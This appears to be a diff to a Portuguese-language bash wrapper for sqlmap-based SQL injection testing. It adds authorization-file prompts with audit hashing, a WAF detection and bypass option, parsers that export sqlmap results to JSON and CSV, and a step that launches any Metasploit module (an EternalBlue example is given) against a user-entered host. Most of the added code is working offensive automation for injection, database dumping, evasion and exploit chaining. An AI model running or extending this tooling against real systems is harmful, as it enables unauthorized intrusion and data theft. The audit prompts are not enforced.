@@ -39,6 +39,7 @@ POST_DATA=""
 TARGET_TYPE="" # "search" ou "login"
 ALL_TECHNIQUES=true
 PARALLEL_MODE=true
+USE_WAF=false
 
 # ============================================================================
 # FUNÇÕES DE UTILIDADE
@@ -295,6 +296,34 @@ opsec_check() {
     echo "[OPSEC] Recomendação: Use VPN antes de iniciar testes" >> "$LOG_DIR/opsec.log"
     echo "═══════════════════════════════════════════════════════════════" >> "$LOG_DIR/opsec.log"
 }
+
+# ====== AUDITORIA E LEGALIDADE ======
+# Solicita arquivo digital de autorização
+print_color yellow "Anexe o arquivo digital de autorização (PDF/JPG/PNG):"
+read -e -p "Caminho do arquivo de autorização: " AUTH_FILE
+if [ ! -f "$AUTH_FILE" ]; then
+    log_jsonl ERROR "Arquivo de autorização não encontrado: $AUTH_FILE" | tee -a "$LOG_DIR/auditoria.jsonl"
+    print_color red "Arquivo de autorização obrigatório. Abortando."
+    exit 1
+fi
+
+# Solicita número de autorização, responsável e tempo de retenção
+read -p "Número do processo/autorização: " AUTH_NUMBER
+read -p "Responsável legal: " AUTH_RESP
+read -p "Tempo de retenção dos dados (ex: 90 dias): " AUTH_RETENTION
+
+# Coleta IP e hash da máquina
+source "$BASE_DIR/lib/opsec.sh"
+OP_IP=$(get_operator_ip)
+MACHINE_HASH=$(get_machine_hash)
+
+# Registra auditoria inicial em JSONL
+source "$BASE_DIR/lib/log.sh"
+log_jsonl INFO "Início da auditoria. Operador: $OPERADOR, IP: $OP_IP, Hash: $MACHINE_HASH, Autorização: $AUTH_NUMBER, Responsável: $AUTH_RESP, Retenção: $AUTH_RETENTION, Arquivo: $AUTH_FILE" | tee -a "$LOG_DIR/auditoria.jsonl"
+
+# Gera hash SHA256 do arquivo de autorização
+AUTH_FILE_HASH=$(sha256sum "$AUTH_FILE" | awk '{print $1}')
+log_jsonl INFO "Hash do arquivo de autorização: $AUTH_FILE_HASH" | tee -a "$LOG_DIR/auditoria.jsonl"
 
 # ============================================================================
 # DETECÇÃO AUTOMÁTICA DE PARÂMETROS
@@ -617,6 +646,44 @@ dump_databases() {
     fi
 }
 
+# ====== DETECÇÃO E BYPASS DE WAF ======
+read -p "Deseja ativar detecção e bypass de WAF? (s/n): " USE_WAF
+WAF_OPTS=""
+if [[ "$USE_WAF" =~ ^[sS]$ ]]; then
+    WAF_OPTS="--identify-waf --delay=2 --retries=3 --random-agent"
+    print_color yellow "Detecção de WAF ativada. Bypass e auto-retry configurados."
+fi
+
+# ====== PARSE PROFISSIONAL DE OUTPUT SQLMAP (JSON) ======
+parse_sqlmap_json_results() {
+    local outdir="$1"
+    for jsonfile in "$outdir"/output*/log.json; do
+        if [ -f "$jsonfile" ]; then
+            jq -c '.results[] | {type, value, dbms, dbms_version, os, technique, data}' "$jsonfile" | tee -a "$LOG_DIR/sqlmap_results.jsonl"
+        fi
+    done
+}
+
+# ====== LOGS CSV CORPORATIVO ======
+export_results_csv() {
+    local outdir="$1"
+    local csvfile="$LOG_DIR/sqlmap_results.csv"
+    echo "target,technique,dbms,dbms_version,os,type,value" > "$csvfile"
+    for jsonfile in "$outdir"/output*/log.json; do
+        if [ -f "$jsonfile" ]; then
+            jq -r '.results[] | [.target,.technique,.dbms,.dbms_version,.os,.type,.value] | @csv' "$jsonfile" >> "$csvfile"
+        fi
+    done
+}
+
+# ====== INTEGRAÇÃO METASPLOIT ======
+read -p "Deseja rodar módulos do Metasploit após SQLi? (s/n): " USE_METASPLOIT
+if [[ "$USE_METASPLOIT" =~ ^[sS]$ ]]; then
+    read -p "Digite o módulo/metasploit resource script (ex: exploit/windows/smb/ms17_010_eternalblue): " MSF_MODULE
+    read -p "Digite o IP/host do alvo para o Metasploit: " MSF_TARGET
+    msfconsole -q -x "use $MSF_MODULE; set RHOSTS $MSF_TARGET; run; exit"
+fi
+
 # ============================================================================
 # RELATÓRIO FINAL
 # ============================================================================
@@ -641,6 +708,10 @@ generate_final_report() {
         echo "FIM DO RELATÓRIO"
         echo "═══════════════════════════════════════════════════════════════"
     } >> "$RELATORIO_FILE"
+    
+    # Ao final do relatório, gera hash SHA256
+    FINAL_HASH=$(sha256sum "$RELATORIO_FILE" | awk '{print $1}')
+    log_jsonl INFO "Hash do relatório final: $FINAL_HASH" | tee -a "$LOG_DIR/auditoria.jsonl"
     
     log "SUCCESS" "Relatório salvo em: $RELATORIO_FILE"
     print_color bold "═══════════════════════════════════════════════════════════════"
